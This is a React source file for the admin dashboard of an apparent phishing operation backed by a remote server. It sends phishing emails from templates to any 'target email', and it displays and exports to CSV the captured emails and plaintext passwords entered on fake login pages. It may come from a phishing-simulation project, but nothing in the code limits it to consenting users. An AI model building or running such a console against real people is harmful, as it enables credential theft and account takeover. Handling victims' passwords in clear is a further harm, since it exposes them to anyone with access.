import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";

function AdminPanel() {
  const [logs, setLogs] = useState([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [templates, setTemplates] = useState([]);
  const [selectedTemplateId, setSelectedTemplateId] = useState("");
  const [targetEmail, setTargetEmail] = useState("");
  const [statusMessage, setStatusMessage] = useState("");
  const [fakeLogins, setFakeLogins] = useState([]);

  const navigate = useNavigate();
  const userEmail = localStorage.getItem("userEmail")?.trim().toLowerCase();

  useEffect(() => {
    fetch("https://phishing-backend-3.onrender.com/api/activity/logs")
      .then((res) => res.json())
      .then((data) => setLogs(data.reverse()))
      .catch((err) => console.error("❌ Failed to fetch logs:", err));

    fetch("https://phishing-backend-3.onrender.com/api/templates")
      .then((res) => res.json())
      .then((data) => setTemplates(data))
      .catch((err) => console.error("❌ Failed to fetch templates:", err));

    fetch("https://phishing-backend-3.onrender.com/api/fake-login")
      .then((res) => res.json())
      .then((data) => setFakeLogins(data))
      .catch((err) => console.error("❌ Failed to fetch fake logins:", err));
  }, []);

  const handleSearch = (e) => {
    setSearchTerm(e.target.value);
  };

  const filteredLogs = logs.filter((log) =>
    log.email.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const deleteLog = async (id) => {
    try {
      const res = await fetch(`https://phishing-backend-3.onrender.com/api/activity/logs/${id}`, {
        method: "DELETE",
      });
      if (res.ok) {
        setLogs(logs.filter((log) => log._id !== id));
      }
    } catch (error) {
      console.error("❌ Error deleting log:", error);
    }
  };

  const exportToCSV = () => {
    const headers = ["Email", "Action", "Timestamp"];
    const rows = logs.map((log) => [
      log.email,
      log.action,
      new Date(log.timestamp).toLocaleString(),
    ]);

    const csvContent =
      "data:text/csv;charset=utf-8," +
      [headers, ...rows].map((e) => e.join(",")).join("\n");

    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", "activity_logs.csv");
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const exportFakeLoginsToCSV = () => {
    const headers = ["Email", "Password", "Clicked From", "Timestamp"];
    const rows = fakeLogins.map((log) => [
      log.email,
      log.password,
      log.clickedFrom || "Unknown",
      new Date(log.timestamp).toLocaleString(),
    ]);

    const csvContent =
      "data:text/csv;charset=utf-8," +
      [headers, ...rows].map((e) => e.join(",")).join("\n");

    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", "fake_logins.csv");
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const sendEmail = async () => {
    if (!targetEmail || !selectedTemplateId) {
      setStatusMessage("❌ Please fill all fields.");
      return;
    }

    try {
      const res = await fetch("https://phishing-backend-3.onrender.com/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          to: targetEmail,
          templateId: selectedTemplateId,
        }),
      });

      const data = await res.json();
      if (res.ok) {
        setStatusMessage("✅ Email sent successfully!");
        setTargetEmail("");
        setSelectedTemplateId("");
      } else {
        setStatusMessage("❌ Failed to send email: " + data.error);
      }
    } catch (err) {
      console.error("❌ Error sending email:", err);
      setStatusMessage("❌ Error sending email.");
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white p-8">
      <h1 className="text-3xl font-bold text-center mb-4">
        🛡️ Admin Dashboard
      </h1>
      <p className="text-center text-gray-300 mb-10">
        Logged in as <span className="text-blue-400">{userEmail}</span>{" "}
        <span className="text-sm text-gray-400">(Admin)</span>
      </p>

      <div className="grid md:grid-cols-2 gap-6 max-w-6xl mx-auto mb-10">
        {/* Send Email Section */}
        <div className="bg-white text-black p-6 rounded-lg shadow-lg">
          <h2 className="text-xl font-semibold mb-4">📨 Send Phishing Email</h2>
          <input
            type="email"
            placeholder="Target email"
            value={targetEmail}
            onChange={(e) => setTargetEmail(e.target.value)}
            className="w-full p-2 mb-4 border border-gray-300 rounded"
          />
          <select
            value={selectedTemplateId}
            onChange={(e) => setSelectedTemplateId(e.target.value)}
            className="w-full p-2 mb-4 border border-gray-300 rounded"
          >
            <option value="">Select a template</option>
            {templates.map((tpl) => (
              <option key={tpl._id} value={tpl._id}>
                {tpl.subject}
              </option>
            ))}
          </select>
          <button
            onClick={sendEmail}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded"
          >
            Send Email
          </button>
          {statusMessage && (
            <p className="mt-4 text-sm text-center text-gray-700">
              {statusMessage}
            </p>
          )}
        </div>

        {/* Log Actions Section */}
        <div className="bg-white text-black p-6 rounded-lg shadow-lg">
          <h2 className="text-xl font-semibold mb-4">📁 Log Actions</h2>
          <input
            type="text"
            placeholder="Search by email"
            value={searchTerm}
            onChange={handleSearch}
            className="w-full p-2 mb-4 border border-gray-300 rounded"
          />
          <div className="space-y-2">
            <button
              onClick={exportToCSV}
              className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-2 rounded"
            >
              ⬇️ Export Activity Logs
            </button>
            <button
              onClick={exportFakeLoginsToCSV}
              className="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-2 rounded"
            >
              ⬇️ Export Fake Logins
            </button>
            <button
              onClick={() => navigate("/create-template")}
              className="w-full bg-purple-600 hover:bg-purple-700 text-white font-semibold py-2 rounded"
            >
              ➕ Create Email Template
            </button>
          </div>
        </div>
      </div>

      {/* Activity Logs Table */}
      <div className="bg-white p-6 rounded-lg shadow-lg text-black mb-12 overflow-x-auto">
        <h2 className="text-xl font-bold mb-4">📊 Activity Logs</h2>
        <table className="min-w-full text-sm">
          <thead className="bg-blue-100">
            <tr>
              <th className="text-left py-2 px-4">📧 Email</th>
              <th className="text-left py-2 px-4">📝 Action</th>
              <th className="text-left py-2 px-4">⏰ Timestamp</th>
              <th className="text-left py-2 px-4">🗑️ Delete</th>
            </tr>
          </thead>
          <tbody className="divide-y">
            {filteredLogs.map((log) => (
              <tr key={log._id}>
                <td className="py-2 px-4">{log.email}</td>
                <td className="py-2 px-4">{log.action}</td>
                <td className="py-2 px-4">
                  {new Date(log.timestamp).toLocaleString()}
                </td>
                <td className="py-2 px-4">
                  <button
                    onClick={() => deleteLog(log._id)}
                    className="text-red-500 hover:text-red-700"
                  >
                    Delete
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* Fake Logins */}
      <div className="bg-white p-6 rounded-lg shadow-lg text-black overflow-x-auto">
        <h2 className="text-xl font-bold mb-4 text-red-600">
          🕵️ Captured Fake Login Attempts
        </h2>
        <table className="min-w-full text-sm">
          <thead className="bg-red-100">
            <tr>
              <th className="text-left py-2 px-4">📧 Email Entered</th>
              <th className="text-left py-2 px-4">🔑 Password</th>
              <th className="text-left py-2 px-4">📨 Link Clicked From</th>
              <th className="text-left py-2 px-4">⏰ Timestamp</th>
            </tr>
          </thead>
          <tbody className="divide-y">
            {fakeLogins.map((log, i) => (
              <tr key={i}>
                <td className="py-2 px-4">{log.email}</td>
                <td className="py-2 px-4">{log.password}</td>
                <td className="py-2 px-4">{log.clickedFrom || "Unknown"}</td>
                <td className="py-2 px-4">
                  {new Date(log.timestamp).toLocaleString()}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}

export default AdminPanel;
